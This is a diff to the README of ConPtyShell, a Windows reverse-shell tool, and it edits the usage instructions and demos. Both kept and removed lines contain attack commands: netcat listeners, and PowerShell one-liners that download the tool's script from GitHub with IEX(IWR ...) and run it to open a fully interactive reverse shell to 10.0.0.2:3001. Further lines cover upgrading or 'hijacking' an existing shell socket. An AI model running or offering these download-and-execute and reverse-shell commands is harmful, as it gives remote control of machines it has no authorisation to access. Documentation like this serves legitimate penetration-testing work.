@@ -10,7 +10,7 @@ Then starts 2 Threads for Async I/O:<br>
 - one thread for reading from the socket and writing to Pseudo Console input pipe;<br>
 - the second thread for reading from the Pseudo Console output pipe and writing to the socket.</p>
 
-ConPtyShell has also the magic button "Upgrade to fully interactive" for your reverse shell, just use it as your needs :)
+ConPtyShell has also the magic flag "Upgrade" that transform your current shell in a fully interactive one, use it if you don't want to use a new connection and want to hijack your current shell socket :)
 
 If you want to know further information regarding ConPty you can find a great article [1] in the references section.
 
@@ -40,12 +40,6 @@ stty raw -echo; (stty size; cat) | nc -lvnp 3001
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
 
-or, if you upload the ps1:
-
-```
-IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell 10.0.0.2 3001
-```
-
 #### Method 2
 If you prefer to have more freedom on the tcp listener and your terminal you can proceed with a "Manual" way to get the reverse shell. In this case it's important that you set rows and cols size when calling the Invoke-ConPtyShell function:
 
@@ -55,8 +49,7 @@ stty size
 nc -lvnp 3001
 Wait For connection
 ctrl+z
-stty raw -echo
-fg[ENTER]
+stty raw -echo; fg[ENTER]
 ```
 ##### Client Side:
 Here you should use the values read from ```stty size``` command in the Parameters -Rows and -Cols
@@ -64,18 +57,8 @@ Here you should use the values read from ```stty size``` command in the Paramete
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 24 -Cols 80
 ```
 
-or, if you upload the ps1:
-
-```
-IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 24 -Cols 80
-```
-
 #### Method 3 - Upgrade
 You can also upgrade your current shell to a fully interecative shell. In this case it's important that you set rows and cols size when calling the Invoke-ConPtyShell function:
-
-**WARN1: Do not use Invoke-WebRequest if you load the assembly directly in powershell because ConPtyShell won't work properly when multiple sockets (and multiple \Device\Afd) are found in the current process**
-
-**WARN2: Only sockets created with the flag WSA_FLAG_OVERLAPPED are compatible with the upgrade. Non overlapped sockets won't give a nice upgraded shell and it will have locks on I/O operations.**
 
 ##### Server Side:
 ```
@@ -83,18 +66,16 @@ stty size
 nc -lvnp 3001
 Wait For connection
 ctrl+z
-stty raw -echo
-fg[ENTER]
+stty raw -echo; fg[ENTER]
 ```
 ##### Client Side:
 Here you should use the values read from ```stty size``` command in the Parameters -Rows and -Cols
 
 ```
-IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell -Upgrade -Rows 24 -Cols 80
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows 24 -Cols 80
 ```
 
-
-#### Change Console Size
+## Change Console Size
 
 In any case if you resize your terminal while you have already open the remote shell you can change the rows and cols size directly from powershell pasting the following code:
 
@@ -106,13 +87,15 @@ $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Ho
 ```
 
 ## Demo
-Below in the video you can watch a simulated scenario where on the left terminal i have a limited access to the server through a webshell and on the right i spawn a fully interactive reverse shell playing around:
+Below you can watch 2 demos. The first gif using the **Method 1** with the compiled assemlby in exe format, the second gif is showing the **Method 3** by upgrading your current shell with the ps1 script:
 
-<img src="https://drive.google.com/uc?id=1xPfNYjhTI5LpovDIustGxkzjNNg2Hc6l">
+#### Method 1
 
-### Upgrade demo
+<img src="demo_1.gif">
 
-<img src="https://drive.google.com/uc?id=1PRuy_qgezsG0rQ7kjSYl6hxlJMLobTh8">
+#### Method 3 - Upgrade demo
+
+<img src="demo_2.gif">
 
 ## References
 
